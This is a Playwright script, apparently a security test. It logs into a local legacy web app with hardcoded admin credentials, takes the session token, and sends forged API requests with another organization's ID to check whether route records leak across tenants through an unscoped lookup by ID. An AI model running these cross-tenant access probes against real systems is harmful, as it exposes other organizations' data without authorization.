const { chromium } = require('playwright');
const LEGACY = 'http://localhost:8080';

async function login(page) {
  await page.goto(`${LEGACY}/index.html`, { waitUntil: 'load', timeout: 30000 });
  await page.waitForTimeout(1500);
  await page.fill('#userName', 'admin');
  await page.fill('#password', '12345');
  await page.locator('#password').blur();
  await page.waitForFunction(() => document.querySelectorAll('#organizationId option').length > 1, { timeout: 10000 });
  await page.selectOption('#organizationId', '1');
  await page.waitForFunction(() => document.querySelectorAll('#unitId option').length > 1, { timeout: 10000 });
  const unitVal = await page.$eval('#unitId option:nth-child(2)', (o) => o.value);
  await page.selectOption('#unitId', unitVal);
  await page.click('input[type="submit"]');
  await page.waitForTimeout(1500);
  const confirmOk = page.locator('button:has-text("Ok")').first();
  if (await confirmOk.isVisible().catch(() => false)) await confirmOk.click();
  await page.waitForFunction(() => !!window.sessionStorage.getItem('token'), { timeout: 15000 });
}

async function main() {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();
  await login(page);
  await page.goto(`${LEGACY}/index.html#/routeAdministration`, { waitUntil: 'load', timeout: 20000 });
  await page.waitForTimeout(1500);

  const token = await page.evaluate(() => window.sessionStorage.getItem('token'));

  const forgedList = await page.evaluate(async (tok) => {
    const res = await fetch('/api/global/route/of/administration/999', {
      headers: { 'Authorization': 'Bearer ' + tok, 'userId': '1', 'unitId': '1' }
    });
    const body = await res.text();
    return { status: res.status, body };
  }, token);
  console.error('Forged orgId=999 (victim), real org1/unit1 identity headers:');
  console.error(JSON.stringify(forgedList, null, 1));

  const byIdVictim = await page.evaluate(async (tok) => {
    const res = await fetch('/api/global/route/of/administration/1/1', {
      headers: { 'Authorization': 'Bearer ' + tok, 'userId': '1', 'unitId': '1' }
    });
    const body = await res.text();
    return { status: res.status, body };
  }, token);
  console.error('org1 path but id=1 belongs to victim org 999 (tests unscoped getById):');
  console.error(JSON.stringify(byIdVictim, null, 1));

  await browser.close();
}
main().catch((e) => { console.error('FATAL', e); process.exit(1); });
